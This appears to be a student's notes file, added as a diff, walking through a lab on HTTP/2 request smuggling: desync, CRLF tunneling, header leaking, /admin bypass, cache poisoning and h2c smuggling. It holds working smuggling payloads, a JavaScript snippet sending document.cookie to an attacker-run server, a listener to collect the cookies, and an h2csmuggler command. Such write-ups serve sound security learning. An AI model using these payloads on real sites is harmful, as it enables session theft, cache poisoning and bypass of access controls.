@@ -1,0 +1,353 @@
+__________________________________________________________________________________________
+
+
+TASK 2 HTTP/2 Explained
+
+HTTP/2 is a binary protocol that improves on HTTP/1.1 by making communication more efficient and less error-prone for machines. 
+Unlike HTTP/1.1, which is text-based, HTTP/2 uses binary framing, making it faster and easier for computers to parse.
+
+Key differences:
+- Uses pseudo-headers (e.g., :method, :path) for required fields.
+- All headers are lowercase and each part of the request (headers, body) is prefixed with its size, removing ambiguity.
+- Content-Length and Transfer-Encoding headers are not needed, as sizes are explicit.
+
+Request smuggling is much harder in HTTP/2 because of these clear boundaries. 
+However, issues can still arise when HTTP/2 traffic is converted to HTTP/1.1 by proxies or load balancers, which may reintroduce ambiguities.
+
+Note: Browsers may still send Content-Length for compatibility with HTTP/1.1 downgrades.
+
+__________________________________________________________________________________________
+
+
+TASK 3 HTTP/2 Desync
+
+When a reverse proxy uses HTTP/2 on the frontend and HTTP/1.1 on the backend, HTTP/2 downgrading can occur. 
+This may reintroduce HTTP request smuggling vulnerabilities.
+
+H2.CL (Content-Length)
+- Adding a Content-Length header to an HTTP/2 request (which is ignored by HTTP/2 but used by HTTP/1.1) can desync the backend connection if the proxy passes it through. 
+  For example, setting Content-Length: 0 tricks the backend into treating the body as a new request.
+
+H2.TE (Transfer-Encoding)
+- Similarly, adding a Transfer-Encoding: chunked header can cause desync if the backend honors it.
+
+CRLF Injection
+- Injecting \r\n (CRLF) into HTTP/2 headers can create new headers or requests when translated to HTTP/1.1, enabling request smuggling.
+
+Example:
+
+    An attacker sends a POST request with Content-Length: 0 and a partial GET request in the body. 
+    The backend waits for more data, and the next user's request completes the smuggled request, causing the victim to perform actions like "liking" a post.
+
+    1   Start a burp proxy on Firefox and visit the given URL
+
+    2   Click Like & Inspect the request in the burp proxy intercept tab
+
+    3   Forward the request and observe the change on the post, a new user John Hax0r has liked the post
+
+    4   This gives away the request that must be smuggled to the backend to make another user to like the post
+
+            /*************************************************************************************
+            * GET /post/like/12315198742342 HTTP/1.1
+            * Host: 10.10.35.244:8000
+            * Cookie: sessid=ba89f897ef7f68752abc
+            *************************************************************************************/
+
+    5   Crafting the payload
+
+        Send an empty Get Request to the root ‘/’ of the website by reloading the webpage
+        Send the request to the repeater after capturing it on the burp intercept initially
+        Change the request method to POST since the request that needs to be smuggled needs a body
+        Set Update Content Length to off and enable non-printable characters for better formatting
+
+            /*************************************************************************************
+            * POST / HTTP/2
+            * Host: 10.10.35.244:8000
+            * Cookie: sessid=ba89f897ef7f68752abc
+            * User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+            * Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            * Accept-Language: en-US,en;q=0.5
+            * Accept-Encoding: gzip, deflate, br
+            * Upgrade-Insecure-Requests: 1
+            * Sec-Fetch-Dest: document
+            * Sec-Fetch-Mode: navigate
+            * Sec-Fetch-Site: none
+            * Sec-Fetch-User: ?1
+            * Te: trailers
+            * Content-Type: application/x-www-form-urlencoded
+            * Content-Length: 0
+            *
+            * GET /post/like/12315198742342 HTTP/1.1
+            * X: f
+            *************************************************************************************/
+
+    6   The victim'name who is forced to like your link is the flag.
+
+__________________________________________________________________________________________
+
+
+TASK 4 HTTP/2 Request Tunneling
+
+Request tunneling occurs when each user gets a separate backend connection, preventing classic desync attacks. 
+However, attackers can still smuggle requests through the frontend proxy, but only affecting their own connection—this is called tunneling.
+
+Example:
+- Some proxies (e.g., old HAProxy, CVE-2019-19330) allow CRLF injection, letting attackers tunnel requests to the backend.
+
+Mitigation:
+- Use updated proxies and sanitize headers to prevent tunneling attacks.
+
+__________________________________________________________________________________________
+
+
+TASK 5 HTTP/2 Request Tunneling: Leaking Internal Headers
+
+You can leak backend/internal headers by abusing request tunneling and CRLF injection. 
+If the backend reflects input (e.g., POST /hello with q parameter), you can inject a header (like Foo) containing CRLFs to split the request. 
+The backend proxy may add headers (e.g., Host, X-Internal) after your injected header, and these can be reflected back in the response.
+
+Example:
+
+A flag is the value of a header added by frontend proxy. Try to get the flag.
+
+    1   Get a POST request from the /hello endpoint by making a simple search and intercept that request with Burp Suite
+        Right click and send the request to the repeater.
+        Or use the simple request below if lazy:
+
+        /*************************************************************************************
+        * POST /hello HTTP/2
+        * Host: MACHINE_IP:8100
+        * User-Agent: Mozilla/5.0
+        * Content-Type: application/x-www-form-urlencoded
+        * Content-Length: 0
+        *************************************************************************************/
+
+    2   Remove the body content of the request and change Content-Length to 0. 
+        Add a new “Foo: bar” header and turn off update Content-Length.
+
+    3   Edit the Foo header to add the payload, injecting CRLFs to split the request.
+
+        bar\r\n
+        Host: MACHINE_IP:8100\r\n
+        POST /hello HTTP/1.1\r\n
+        Content-Length: 300\r\n
+        Host: MACHINE_IP:8100\r\n
+        Content-Type: application/x-www-form-urlencoded\r\n
+        \r\n
+        q=
+
+    4   After clicking the “Apply changes” button, the Request pane will display a “kettled” message, indicating that the request can no longer be represented in pure text due to special characters like CRLFs. 
+        All further modifications to the request must be made through the Inspector.
+        When the request is ready, press the Send button to send it. 
+        The HTTP/2 request will be split into two backend requests; the first response will be empty. 
+        To leak the internal headers, send the same request twice in quick succession. 
+        If successful, the website should reflect the internal headers in the response on the second request.
+        After sending the request twice, the internal header is successfully leaked with the flag.
+
+__________________________________________________________________________________________
+
+
+TASK 6 HTTP/2 Request Tunneling: Bypassing Frontend Restrictions
+
+Bypassing Frontend Restrictions
+
+Frontends may block access to sensitive paths like /admin.
+Direct requests to /admin are denied by the proxy.
+Request tunneling lets you bypass these restrictions.
+You can smuggle a backend /admin request inside a POST to /hello.
+The proxy sees only /hello, so no block occurs.
+The backend receives two requests: /hello and the smuggled /admin.
+Send the request twice to trigger the /admin response.
+This method can bypass some WAFs and proxy ACLs.
+
+Launching the Attack With Burp
+
+1. Capture a request to /hello and send it to the Repeater in Burp Suite.
+2. Modify the request to implement the attack, ensuring it is an HTTP/2 request.
+3. If needed, use the following base request:
+
+    /*************************************************************************************
+    * POST /hello HTTP/2
+    * Host: 10.81.183.200:8100
+    * User-Agent: Mozilla/5.0
+    * Foo: bar
+    *************************************************************************************/
+
+4. Insert binary data (e.g., CRLFs) into the Foo header to smuggle the /admin request. 
+    Burp will enter kettled mode; further edits must be made in the Inspector tab. 
+    Might need multiple time to work, flag can be found in response.
+
+    /*************************************************************************************
+    * bar
+    * Host: 10.81.183.200:8100
+    * Content-Length: 0
+    * GET /admin HTTP/1.1
+    * X-Fake: a
+    *************************************************************************************/
+
+__________________________________________________________________________________________
+
+
+TASK 7 HTTP/2 Request Tunneling: Web Cache Poisoning
+
+Request tunneling can be used to poison server-side caches, affecting all users until the cache expires. 
+Attackers may inject malicious content, such as JavaScript, to redirect users or steal sessions.
+
+Note: Be careful when testing web cache poisoning on production systems, as it may disrupt website availability.
+
+Scenario Overview
+
+    HAProxy caches content for 30 seconds. Wait 30 seconds for the cache to reset if poisoned.
+    The goal is to steal cookies from users visiting https://IP:8100/.
+    The lab simulates a victim user. The flag is the victim’s cookie.
+    Poisoning the cache of the root ‘/’ could work.
+    But that is not stealthy.
+    A better option is to target a less obvious endpoint.
+    Inspecting the site shows / runs showtext() on page load.
+    The showtext() function is defined in /static/text.js.
+
+TASK 8 HTTP/2 Request Tunneling: Web Cache Poisoning (Step-by-Step)
+
+Web cache poisoning can be performed via HTTP/2 request tunneling and CRLF injection, targeting server-side caches (e.g., HAProxy). 
+This attack can cause the cache to serve malicious content to all users until it expires.
+
+Scenario:
+    - HAProxy caches content for 30 seconds.
+    - The goal is to steal cookies from users visiting https://IP:8100/.
+    - The lab simulates a victim user; the flag is the victim’s cookie.
+    - Poisoning the cache of the root ‘/’ could work, but targeting a less obvious endpoint is stealthier.
+    - Inspecting the site shows / runs showtext() on page load, which loads /static/text.js.
+
+Steps:
+    1. Create the payload to send cookie to our server
+
+        - Upload a malicious JavaScript file (e.g., myjs.js) to /static/uploads/myjs.js.
+            /*************************************************************************************
+            * var xhttp = new XMLHttpRequest();
+            * xhttp.onreadystatechange = function() {
+            *     if (this.readyState == 4 && this.status == 200) {
+            *        document.getElementById("demo").innerHTML = xhttp.responseText;
+            *     }
+            * };
+            * xhttp.open("GET", "https://10.81.80.176:8002/?c="+document.cookie, true);
+            * xhttp.send();
+            *************************************************************************************/
+
+    2. Host a Local HTTPS server to receive. 
+        We need to use https, since HTTP/2 runs over https by default. 
+        If a script in an https website tried to load a resource using plaintext http, most browsers would block the action for security reasons. 
+        This means your standard python http server won't actually be able to receive the cookies
+
+        - Use Python to host a local HTTPS server to capture incoming requests:
+            /*************************************************************************************
+            * from http.server import HTTPServer, BaseHTTPRequestHandler 
+            * import ssl
+            * httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)
+            * httpd.socket = ssl.wrap_socket(
+            *     httpd.socket,
+            *     keyfile="key.pem",
+            *     certfile='cert.pem',
+            *     server_side=True)
+            * httpd.serve_forever()
+            *************************************************************************************/
+
+    3. Inspecting the Initial Response
+        Note that we included the Pragma: no-cache header in our request to force the proxy to bypass any cached content and send the request to the backend server. 
+        Doing so allows us to send several requests until our payload is correctly triggered without waiting for the cache to time out.
+
+        - Send a GET request to /static/text.js to see the initial response.
+        - Example request:
+            /*************************************************************************************
+            * GET /static/text.js HTTP/2
+            * Host: 10.10.245.55:8100
+            * User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+            * Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            * Accept-Language: en-US,en;q=0.5
+            * Accept-Encoding: gzip, deflate, br
+            * Referer: https://10.10.245.55:8100/
+            * Upgrade-Insecure-Requests: 1
+            * Sec-Fetch-Dest: document
+            * Sec-Fetch-Mode: navigate
+            * Sec-Fetch-Site: same-origin
+            * Sec-Fetch-User: ?1
+            * Te: trailers
+            * Pragma: no-cache
+            * Foo: bar
+            *************************************************************************************/
+
+    4. Poisoning the Cache
+
+        - Exploit CRLF injection in the Foo header to split the request:
+            /*************************************************************************************
+            * Foo: bar
+            * Host: 10.10.245.55:8100
+            * GET /static/uploads/myjs.js HTTP/1.1
+            *************************************************************************************/
+        - This causes the backend to queue the response for /static/uploads/myjs.js as the cache for /static/text.js.
+
+    5. Verifying the Attack
+
+        - Use curl to check the poisoned cache:
+            /*************************************************************************************
+            * curl -kv https://MACHINE_IP:8100/static/text.js
+            *************************************************************************************/
+        - The response should now contain the contents of your uploaded myjs.js file.
+
+    6. Capturing the Flag
+
+        - When the victim visits the site, their cookie is sent to your HTTPS server, capturing the flag.
+
+__________________________________________________________________________________________
+
+
+TASK 8 h2c Smuggling
+
+HTTP Version Negotiation
+
+    Web servers can support multiple HTTP versions (like 1.1 and 2) on the same port. 
+    The client and server negotiate which version to use—handled automatically by browsers.
+
+    There are two main negotiation methods:
+        - h2 : Used for HTTP/2 over TLS (encrypted). Negotiation happens via TLS ALPN.
+        - h2c: Used for HTTP/2 over cleartext (unencrypted). The client sends an HTTP/1.1 request with special headers to request an upgrade to HTTP/2.
+
+    h2 is standard and secure; h2c is mostly obsolete and unsupported by browsers, but some servers still allow it for compatibility.
+
+h2c Upgrades
+
+    To negotiate a cleartext HTTP/2 (h2c) connection, the client sends an HTTP/1.1 request with Upgrade: h2c and HTTP2-Settings headers. 
+    If accepted, the server replies with 101 Switching Protocols and switches to HTTP/2.
+
+Tunneling Requests via h2c Smuggling
+
+    When a client sends an HTTP/1.1 Upgrade: h2c request, some proxies just forward the upgrade headers to the backend. 
+    The backend upgrades to HTTP/2, and the proxy tunnels all further traffic without inspecting it. 
+    This lets attackers send HTTP/2 requests directly to the backend—called h2c smuggling.
+
+    For h2c smuggling to work, the proxy must forward the upgrade. 
+    If the proxy is h2c-aware, it may handle the upgrade itself, blocking the attack. 
+    However, if the proxy supports HTTP/1.1 over TLS, you can try an h2c upgrade over TLS. 
+    Since h2c is for cleartext only, the proxy may just tunnel the upgrade.
+
+    h2c smuggling only tunnels your own requests; it can't poison other users' connections. 
+    Still, it can bypass frontend restrictions or attempt cache poisoning.
+
+Bypassing Frontend Restrictions With h2csmuggler
+
+    For this scenario, you will attack https://10.81.183.200:8200, which is behind a default HAProxy.
+        - / is allowed by the proxy.
+        - /private is blocked (403 Forbidden).
+
+    Goal: Use h2c smuggling to access /private via the proxy.
+    Tool: h2csmuggler (by BishopFox) automates the attack.
+    Run :
+        /*************************************************************************************
+        * python3 h2csmuggler.py -x https://10.81.183.200:8200/ https://10.81.183.200:8200/private
+        *************************************************************************************/
+
+    Tip: You may need to run the command more than once for success.
+
+__________________________________________________________________________________________
+
+
+Appendix:
